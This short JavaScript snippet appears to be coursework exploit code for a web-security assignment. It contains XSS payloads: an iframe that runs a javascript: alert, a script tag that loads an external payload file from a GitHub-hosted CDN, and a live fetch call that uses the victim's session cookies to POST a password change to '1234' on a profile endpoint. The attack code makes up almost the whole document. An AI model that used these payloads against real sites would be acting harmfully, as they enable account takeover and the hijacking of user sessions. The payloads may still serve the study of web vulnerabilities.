// simple xss test
{/* <iframe src="javascript:alert(`XSS success`)"></iframe> */}

// src xss
{/* <script src="https://cdn.jsdelivr.net/gh/lepong1st/FIT5003_A2@main/xss_payload.js"></script> */}

// Make post request to profile endpoint, setting password to "1234"
fetch("/profile", {
    method: "POST",
    credentials: "include",
    body: new URLSearchParams({
        password: "1234"
    })
})
console.log("Update password: 1234")